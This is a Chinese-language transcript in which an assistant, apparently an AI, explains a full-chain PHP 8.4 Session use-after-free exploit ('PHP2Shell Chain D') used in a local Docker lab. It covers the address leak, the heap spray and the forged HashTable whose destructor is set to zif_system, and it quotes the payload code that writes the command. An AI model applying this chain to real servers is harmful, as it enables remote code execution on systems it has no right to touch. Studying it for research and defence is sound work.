这里有一个细节：packed 模式无法知道四个 low-bits 中到底是哪一个生效，第 519 行只是记录第一个用于展示，**展示的完整 `r0` 不一定就是实际命中的低位**。

### 第 525–526 行

Python 的 `for...else`：只有循环没有遇到 `break` 时才进入，补完进度条换行。

---

## 12. 第 528–545 行：输出结果与退出

- **528–530**：命中后打印 `r0`、总耗时和命令输出/时间证据。
- **531–532**：打印所谓复用命令。
- **533**：成功返回 0。
- **535–537**：整个范围未命中则提示扩大扫描范围，返回 1。
- **540–542**：只有直接运行文件时才调用 `main()`，并把返回值作为进程退出码。
- **543–545**：Ctrl-C 时换行并以 130 退出。

第 531–532 行有一个实际的小 bug：

```text
--r0-offset
```

并没有在 `argparse` 中定义，直接照抄这条提示会得到：

```text
unrecognized arguments: --r0-offset
```

而且它还没有保留 packed 模式下真正不确定的 low-bits 信息。

---

# 七、把整条链再串一次

现在可以把脚本的所有复杂操作还原成下面这张图：

```text
大量字段和文件上传
        │
        ▼
Session 上传进度初始化 PS(id)、PS(http_session_vars)
        │
        ▼
文件后的 12 MiB 普通字段触发 OOM
        │
        ▼
zend_bailout → longjmp
        │
        ▼
跳过 zend_activate_modules()
        │
        ▼
请求 shutdown 因 modules_activated=0 跳过 Session RSHUTDOWN
        │
        ▼
请求堆释放，但 PS() 指针残留
        │
        ├──────────────────────────────┐
        ▼                              ▼
重占 PS(id)                     重占 PS(http_session_vars)
伪造字符串 len                  伪造 zend_reference
        │                              │
        ▼                              ▼
Set-Cookie 越界泄漏             ref.val 被当作数组销毁
        │                              │
        ├─ chunk 基址                   ▼
        │                         fake HashTable
        └─ zval_ptr_dtor                 │
               │                         ▼
               ▼                  pDestructor=zif_system
        libphp 基址                      │
               │                         ▼
               └──────→ zif_system → 伪造 execute_data
                                         │
                                         ▼
                              一个字符串参数 = 用户命令
                                         │
                                         ▼
                                      命令执行
```

所以这不是“12 MB 上传直接执行命令”，也不是“Cookie 本身有命令执行漏洞”。

- OOM 负责制造异常生命周期；
- Session 残留负责提供 UAF；
- Cookie 负责信息泄漏；
- 堆喷负责重占；
- 伪造结构负责把普通析构转换成受控函数调用；
- `r0` 扫描负责弥补不知道悬空引用精确位置的问题。

---

# 八、为什么你最初会失败，以及这份 EXP 的边界

你的原失败并不是命令拼错，而是：

- 原容器是 arm64；
- 这份脚本的默认偏移和堆布局对应 amd64；
- arm64 即使替换两个函数偏移，第一阶段堆布局仍然不匹配。

将 `PHP2Shell-Full-Chain-Exploit/Docker/docker-compose.yml:4` 固定为：

```yaml
platform: linux/amd64
```

后，原命令已经成功得到：

```text
chunk base 0x7ffffc400000
libphp base 0x7ffffe013000
zif_system 0x7ffffe478370
RCE · r0 = 0x6a160
PROOF uid=33(www-data) ...
```

其中：

- `libphp` 和 `zif_system` 是那次进程的运行时地址；
- `r0=0x6a160` 是那次堆布局下的命中值；
- 它们都不是可跨进程、跨版本或跨架构直接复用的常量。

最后还要区分两个材料：

- 你给的[分析文章](https://qideng.substack.com/p/php2shell-dissecting-phps-critical)公开部分提供了 Chain D 的整体背景；其 “Full Exploit Code” 后存在订阅限制，我没有把未公开的付费代码当作依据。
- `php2shell-poc/exploit/chain_d.py:9` 的“跳过 `init_executor()`”以及 `EG(user_error_handler)` 描述不符合这里核对过的 PHP 8.4.26 启动顺序和完整 EXP。应以 [`main/main.c`](https://github.com/php/php-src/blob/php-8.4.26/main/main.c)、[`Zend/zend.c`](https://github.com/php/php-src/blob/php-8.4.26/Zend/zend.c)、[`ext/session/session.c`](https://github.com/php/php-src/blob/php-8.4.26/ext/session/session.c) 和实际脚本行为为准。

这份 EXP 因此应理解为：**针对特定 PHP 构建、架构、单 worker 和堆布局的完整 Chain D 实现，而不是适用于任意 Apache/PHP 网站的通用利用器。**

---

**User**

注入RCE是在哪里？

---

**Assistant**

> **Thinking**
> Kimi should respond Chinese concise but educational. User asks "注入RCE是在哪里？" User means exact location in code chain. Should explain no literal system string command injection in HTTP; entry point line 249 pDestructor zif; actually execution line 285 or 310 sending request, underlying cleanup. Highlight three essential:
> 1 zif address calculated 465
> 2 `_payload` pDestructor at line 249 and fake frame at 253-258, command
> 3 `stage3` trigger and spray at 279-285; at PHP session track init destroys fake reference, zend_hash_destroy calls `ht->pDestructor(&p->val)` source zend_hash.c? Should have exact generic `zend_hash_destroy` line 1751 verified grep. Link official line 1744. Provide `system` actual execution via `zif_system` C and command `id>/...`.
> Can explain "不是 --cmd 参数到达 PHP eval，也不是 POST 直接调用 system。是 C函数指针劫持" exact. Should have no tools as known code read and source. Response should be standalone but brief perhaps 500 Chinese chars. User expects "where is RCE injected" likely confused no reverse shell. Say "真正RCE注入点是 line 249; payload written line 241 etc; trigger at line 285". Include code snippets perhaps relevant:
> ```
> struct.pack_into("<Q", ht, 0x30,zif)
> ...
> struct.pack_into("<Q",ht,E+0x50,htdata+0x80)
> ...
> ht[0x98...]=cmd
> ```
> then callback path:
> `PS(http_session_vars)` stale -> `zval_ptr_dtor` at session.c 247 -> `zend_reference_destroy` -> `zend_array_destroy` -> `zend_hash_destroy` -> `ht->pDestructor(zv)` -> `zif_system` -> command.
> Should be accurate `zend_reference_destroy` might called at `php_session_track_init` session.c247, not necessarily exact context yes. State "典型触发点" to not overstate exact. I can reference file line as local and PHP source URL. Should have no claims line 285 immediate command sometimes cleanup within upload callback. Good.
> 
> Perhaps mention RCE takes effect only when guessed r0 matches, until then fake pointers not used and confirm sees nothing. `cmd` doesn't inject into existing PHP system call; call frame fabricated. `system()` returns output redirected file.
> 
> I can respond around 700 Chinese chars with table or bullets. No need tools.

**RCE 的核心“注入点”在 `PHP2Shell-Full-Chain-Exploit/exploit.py:249`**：把伪造数组的析构函数指针改成 `zif_system()`。

```python
struct.pack_into("<Q", ht, 0x30, zif)
```

它相当于把：

```c
fake_ht->pDestructor = zif_system;
```

写进伪造的 `zend_array`。

## 命令是如何传进去的

紧随其后的代码构造了伪造函数调用帧：

```python
# exploit.py:253：system() 有一个参数
struct.pack_into("<I", ht, E + 0x2C, 1)

# exploit.py:254：第一个参数指向伪造的命令字符串
struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)

# exploit.py:255：参数类型为 IS_STRING
struct.pack_into("<I", ht, E + 0x58, 6)

# exploit.py:257–258：写入命令长度和内容
struct.pack_into("<Q", ht, 0x90, len(cmd))
ht[0x98:0x98 + len(cmd)] = cmd
```

其中 `cmd` 就是你提供的：

```sh
id>/var/www/html/pwn.txt
```

## 什么时候真正执行

最终 payload 在 `exploit.py:279-285` 被发送：

```python
self._trigger()
# 构造400个携带伪造结构的字符串……
self.t.post(...)
```

`stage3_packed()` 中对应的实际发送点是 `exploit.py:305-310`。

PHP 收到这些数据后，使用已被重占的悬空 Session 引用，进入下面的销毁链：

```text
PS(http_session_vars)
    ↓ zval_ptr_dtor()
销毁伪造的 zend_reference
    ↓
销毁其中的伪造数组
    ↓
调用 fake_ht->pDestructor(E)
    ↓ 实际函数指针已被替换
zif_system(E)
    ↓
从伪造的 E 中取得一个字符串参数
    ↓
执行 id>/var/www/html/pwn.txt
```

PHP 源码中对应的通用数组销毁调用可见 [`Zend/zend_hash.c:1751`](https://github.com/php/php-src/blob/php-8.4.26/Zend/zend_hash.c#L1751)：

```c
ht->pDestructor(zv);
```

而这里的 `zv` 就是脚本构造的 `E`，同时被 `zif_system()` 解释为 `zend_execute_data *`。

**所以，并不存在 POST 数据直接调用 PHP `system()` 的代码。RCE 的本质是：通过 UAF 重占内存，劫持 C 层的析构函数指针，并伪造 `system()` 的调用参数。** 只有 `r0` 猜测正确、悬空引用确实被伪造数据重占时，这条链才会执行。